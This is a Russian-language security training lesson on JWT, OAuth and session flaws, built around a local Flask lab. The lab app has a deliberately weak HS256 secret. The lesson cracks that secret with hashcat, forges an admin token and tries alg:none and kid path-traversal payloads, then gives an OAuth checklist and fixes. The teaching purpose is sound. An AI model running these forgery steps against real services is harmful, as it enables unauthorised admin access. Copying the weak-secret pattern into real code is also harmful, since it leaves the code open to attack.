# 8.5 — JWT, OAuth и сессии

> **M08 · Этап 1 · 5 ч · 🟡 · артефакт:** `labs/m08-web-api/l05-auth/`

## Цель

Понять, как приложение проверяет «кто ты» в API, и найти типовые ошибки: слабый секрет, `alg:none`, доверие к `role` из токена.

## Результат

- Ломаете HS256-секрет и подделываете токен с `role=admin`.
- Проверяете `alg:none` и `kid`-инъекцию.
- Знаете чек-лист OAuth (state, redirect_uri, PKCE).

## Теория

- JWT = `base64url(header).base64url(payload).signature`.
- Подпись проверяет целостность, но **не** шифрует: payload читается всеми.
- `alg:none` — если сервер доверяет алгоритму из токена, подпись не проверяется.
- Слабый секрет ломается офлайн (hashcat mode 16500).
- `kid` может использоваться в path traversal/SQLi, если подставляется в запрос.
- OAuth: `state` против CSRF, `redirect_uri` строго allowlist, PKCE для public clients.
- Сессия в cookie должна быть `HttpOnly`, `Secure`, `SameSite`.

## Лаборатория

Создайте `jwt_app.py`:

```python
from flask import Flask, request
import jwt, datetime

app = Flask(__name__)
SECRET = "secret"

@app.get("/login")
def login():
    token = jwt.encode(
        {"user": "alice", "role": "user",
         "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=1)},
        SECRET, algorithm="HS256")
    return {"token": token}

@app.get("/admin")
def admin():
    token = request.headers.get("Authorization", "").replace("Bearer ", "")
    try:
        data = jwt.decode(token, SECRET, algorithms=["HS256"])
    except Exception as e:
        return {"error": str(e)}, 401
    return ({"msg": "welcome admin"} if data.get("role") == "admin" else {"msg": "denied"}), 200
```

```bash
pip install flask pyjwt --break-system-packages
python jwt_app.py
```

### 1. Получить токен

```bash
TOKEN=$(curl -s http://127.0.0.1:5000/login | jq -r .token)
echo "$TOKEN" | cut -d. -f1 | base64 -d 2>/dev/null; echo
echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null; echo
curl -s -H "Authorization: Bearer $TOKEN" http://127.0.0.1:5000/admin
```

Ожидаемо: header `{"alg":"HS256","typ":"JWT"}`, payload с `role:user`, ответ `denied`.

### 2. Сломать секрет

```bash
echo "$TOKEN" > token.txt
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

Ожидаемо: `secret`. Если hashcat не заводится — `john --format=HMAC-SHA256 token.txt --wordlist=...` (формат может отличаться) или перебор в Python.

### 3. Подделать токен

```python
import jwt
print(jwt.encode({"user":"alice","role":"admin"}, "secret", algorithm="HS256"))
```

```bash
FORGED=$(python forge.py)
curl -s -H "Authorization: Bearer $FORGED" http://127.0.0.1:5000/admin
```

Ожидаемо: `welcome admin`.

### 4. alg:none и kid

```bash
jwt_tool "$TOKEN" -X a    # попытка alg:none
jwt_tool "$TOKEN" -I -hc kid -hv "../../dev/null"
```

Ожидаемо: приложение, которое доверяет `alg`/`kid`, примет подделку. Ваш `jwt_app.py` — нет (PyJWT требует алгоритм), и это правильное поведение.

### 5. OAuth-чеклист

Для любого OAuth-приложения проверьте:

| Проверка | Ожидаемо |
|---|---|
| `state` обязателен | Да, и сверяется |
| `redirect_uri` | Точное совпадение, не `startsWith` |
| PKCE | Для public client |
| Срок токена | Короткий + refresh rotation |
| Scopes | Минимальные |

## Атака и защита

- **Атака:** подделка токена, кража через XSS, open redirect → code theft, fixation.
- **Детект:** токены с `alg:none`, аномальные `kid`, вход с нового IP, повторное использование refresh.
- **Фикс:** сильный секрет/RS256, строгая проверка `alg`, allowlist `redirect_uri`, PKCE, rotation, короткий TTL.

## Самопроверка

- [ ] Почему JWT payload нельзя считать секретом?
- [ ] Чем `alg:none` опасен?
- [ ] Зачем `state` в OAuth?
- [ ] Что делает `kid` и почему это вектор?

## Дальше

[8.6 — API: BOLA и mass assignment](l06-api.md)
